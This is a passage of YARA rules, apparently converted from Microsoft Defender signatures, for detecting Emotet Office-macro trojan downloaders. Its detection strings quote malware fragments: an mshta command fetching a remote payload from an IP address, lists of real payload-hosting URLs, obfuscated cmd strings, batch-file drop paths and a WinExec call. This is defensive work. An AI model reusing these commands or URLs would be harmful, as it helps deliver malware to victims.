        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {22 77 69 6e [0-6] 6d [0-6] 67 [0-6] 6d [0-6] 74 [0-6] 73 [0-6] 3a [0-6] 57 [0-6] 69 [0-6] 6e [0-6] 33 [0-6] 32 [0-6] 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SO_2147746081_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SO!MTB"
        threat_id = "2147746081"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-90] 28}  //weight: 1, accuracy: Low
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 [0-20] 28 [0-32] 29 [0-6] 44 69 6d 20 [0-20] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SP_2147746105_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SP!MTB"
        threat_id = "2147746105"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = "+ (\"STARTU\")" ascii //weight: 1
        $x_1_3 = {22 73 3a 57 [0-6] 69 [0-6] 6e [0-6] 33 [0-6] 32 [0-6] 5f [0-6] 50 [0-18] 72 [0-6] 6f [0-6] 63 [0-6] 65 [0-6] 73 [0-6] 73}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SQ_2147746147_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SQ!MTB"
        threat_id = "2147746147"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Create" ascii //weight: 1
        $x_1_2 = {2b 20 22 53 [0-21] 54 [0-32] 41}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 22 77 [0-9] 69 [0-9] 6e [0-9] 6d [0-9] 67 [0-9] 6d [0-9] 74 [0-9] 73 [0-9] 3a}  //weight: 1, accuracy: Low
        $x_1_4 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-9] 46 6f 72}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SR_2147746164_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SR!MTB"
        threat_id = "2147746164"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-18] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 53 [0-21] 54 [0-32] 41 [0-20] 52 [0-21] 54 [0-32] 55 22}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 28 [0-90] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\rtyusdj.bat" ascii //weight: 1
        $x_1_2 = "c:\\programdata\\uylcsekn.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "mshta http://91.240.118.168/qqqw/aaas/se.html" ascii //weight: 1
        $x_1_2 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f [0-15] 2f [0-15] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4e 65 78 74 02 00 44 6f 20 57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {22 73 3a 57 [0-9] 69 [0-9] 6e [0-18] 33 [0-18] 32 [0-18] 5f [0-18] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Text = \"cwgjamd /wgjac swgjatarwgjat/wgjaB" ascii //weight: 1
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2e 54 65 78 74 42 6f 78 ?? 2e 54 65 78 74 2c 20 22 77 67 6a 61 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 [0-53] 2e 54 61 67 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 31 2c 20 [0-53] 2e 43 6f 6d 62 6f 42 6f 78 31 2e 54 61 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(vbir7uegfwi7egfs8udgfkjegbtk.TextBox4.Text, \"wgja\", \"\")" ascii //weight: 1
        $x_1_2 = "Text = \"cwgjamd /wgjac swgjatarwgjat/wgjaB" ascii //weight: 1
        $x_1_3 = ".Tag = Left(dbhskdhv.Cell(2, 1), Len(dbhskdhv.Cell(2, 1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Open \"c:\\programdata\\1.cmd\" For Append As #1" ascii //weight: 1
        $x_1_2 = "WinExec \"c:\\programdata\\1.cmd\", 0" ascii //weight: 1
        $x_1_3 = "VB_Name = \"frmpage\"" ascii //weight: 1
        $x_1_4 = {50 72 69 6e 74 20 23 31 2c 20 66 72 6d 70 61 67 65 2e 4c 61 62 65 6c 31 2e 43 61 70 74 69 6f 6e [0-3] 6d 5f 46 6f 72 6d 57 69 64 20 3d 20 53 63 61 6c 65 57 69 64 74 68 [0-3] 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jiugiy = \"c\" + hfk2wjekj & \":\\pro\" + hfk2wjekj" ascii //weight: 1
        $x_1_2 = "ext$ = \".\" & Split(filename$, \".\")(UBound(Split(filename$, \".\")))" ascii //weight: 1
        $x_1_3 = "jiugiy = jiugiy & \"gramd\" + hfk2wjekj + \"ata\\gtdyyu.b\"" ascii //weight: 1
        $x_1_4 = "jiugiy = jiugiy + \"at\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = ".Text = \"cwgjamd /wgjac swgjatarwgjat/wgjaB" ascii //weight: 2
        $x_1_2 = {4f 70 65 6e 20 [0-53] 2e 54 61 67 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = "LogFileFullName = ThisWorkbook.Path & \"\\common.log" ascii //weight: 1
        $x_1_4 = {78 6d 6c 68 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 55 52 4c 24 2c 20 54 72 75 65 3a 20 44 6f 45 76 65 6e 74 73 [0-3] 78 6d 6c 68 74 74 70 2e 53 65 6e 64 3a 20 44 6f 45 76 65 6e 74 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "new.tokosatu.com/wp-admin/QzzQZAIDuBhOplwOnhJ/" ascii //weight: 1
        $x_1_2 = "vasilestudio.com/wp-admin/vh8oEprCE3/" ascii //weight: 1
        $x_1_3 = "filmywap.casa/wp-includes/mSDKKyOs21N/" ascii //weight: 1
        $x_1_4 = "fullmaza.newsfresh.net/xc70-200k/lhXXF/" ascii //weight: 1
        $x_1_5 = "chughtai.xyz/cgi-bin/r0hNrJM20mGthgS8/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 73 63 72 69 70 74 2e 53 68 65 6c 6c [0-15] 77 52 70 63 65 73 52 70 63 65 63 72 52 70 63 65 69 70 52 70 63 65 74 52 70 63 65 63 3a 52 70 63 65 5c 52 70 63 65 70 72 52 70 63 65 6f 67 72 52 70 63 65 61 6d 52 70 63 65 64 61 52 70 63 65 74 61 5c 77 65 74 69 64 6a 6b 73 2e 76 52 70 63 65 62 52 70 63 65 73}  //weight: 1, accuracy: Low
        $x_1_2 = "ACIAaAB0AHQAcABzADoALwAvAG0AbwBuAGUAeQBxAHUAbwB0AGUALgBqAGEALgBkAGUAYQBsAHMALwBhAHMAcwBlAHQAcwAvAGoAYwBDAHcAeAB2AHUAUwBSAHAARQBTADcAVgBoAFcAeABqAC8A" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://duvarkagitlarimodelleri.com/42hhp/gZXakh7/" ascii //weight: 1
        $x_1_2 = "https://dolphinwavehavuzrobotu.com/wp-includes/RmCbvIKjjtlB3tabyPo" ascii //weight: 1
        $x_1_3 = "http://animalsandusfujairah.com/wp-admin/JWO58zeUOwSI" ascii //weight: 1
        $x_1_4 = "https://havuzkaydiraklari.com/wp-includes/YqYdLFA/" ascii //weight: 1
        $x_1_5 = "http://vipwatchpay.com/Isoetales/5wy8L0TQ1xCZEr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SS_2147746213_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SS!MTB"
        threat_id = "2147746213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"t\"&\"p\"&\"s://n\"&\"e\"&\"w\"&\"k\"&\"a\"&\"n\"&\"o.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"m\"&\"i\"&\"n/6\"&\"6\"&\"r\"&\"I\"&\"s\"&\"r\"&\"V\"&\"w\"&\"o\"&\"P\"&\"K\"&\"U\"&\"s\"&\"j\"&\"c\"&\"A\"&\"s" ascii //weight: 1
        $x_1_2 = "t\"&\"t\"&\"p://o\"&\"c\"&\"a\"&\"l\"&\"o\"&\"g\"&\"u\"&\"l\"&\"l\"&\"a\"&\"r\"&\"i.c\"&\"o\"&\"m/i\"&\"n\"&\"c/W\"&\"c\"&\"m\"&\"8\"&\"2\"&\"e\"&\"n\"&\"r\"&\"s" ascii //weight: 1
        $x_1_3 = "t\"&\"tp\"&\"s://m\"&\"yp\"&\"h\"&\"a\"&\"m\"&\"c\"&\"u\"&\"a\"&\"t\"&\"u\"&\"i.c\"&\"o\"&\"m/a\"&\"s\"&\"s\"&\"e\"&\"t\"&\"s/O\"&\"P\"&\"V\"&\"e\"&\"V\"&\"S\"&\"p\"&\"O/" ascii //weight: 1
        $x_1_4 = "t\"&\"t\"&\"p://s\"&\"i\"&\"e\"&\"u\"&\"t\"&\"h\"&\"i\"&\"p\"&\"h\"&\"u\"&\"t\"&\"u\"&\"n\"&\"g\"&\"x\"&\"e\"&\"n\"&\"a\"&\"n\"&\"g.c\"&\"o\"&\"m/o\"&\"l\"&\"d_s\"&\"o\"&\"u\"&\"r\"&\"c\"&\"e/9\"&\"b\"&\"o\"&\"J\"&\"Q\"&\"Z\"&\"p\"&\"T\"&\"S\"&\"d\"&\"Q\"&\"E/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ST_2147746231_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ST!MTB"
        threat_id = "2147746231"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-18] [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-9] 46 6f 72}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {4e 65 78 74 02 00 4e 65 78 74 02 00 53 65 74}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SU_2147746243_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SU!MTB"
        threat_id = "2147746243"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SV_2147746263_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SV!MTB"
        threat_id = "2147746263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-9] 53 65 6c 65 63 74 20 43 61 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-22] 28 29 [0-9] 53 65 6c 65 63 74 20 43 61 73 65}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SW_2147746272_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SW!MTB"
        threat_id = "2147746272"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 22 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a 57 [0-21] 69 [0-21] 6e [0-21] 33 [0-21] 32 [0-21] 5f [0-21] 22 2c 20 22 [0-21] 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SX_2147747839_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SX!MTB"
        threat_id = "2147747839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 22 [0-21] 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a [0-21] 57 [0-21] 69 [0-21] 6e [0-21] 33 [0-21] 32 [0-37] 22 2c 20 22 [0-21] 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SY_2147747870_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SY!MTB"
        threat_id = "2147747870"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 65 78 74 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-21] 28 29 [0-16] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SZ_2147747905_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SZ!MTB"
        threat_id = "2147747905"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 [0-8] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 22 [0-21] 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a 57 [0-21] 69 [0-21] 6e [0-21] 33 [0-21] 32 [0-21] 22 2c 20 [0-21] 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TA_2147747937_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TA!MTB"
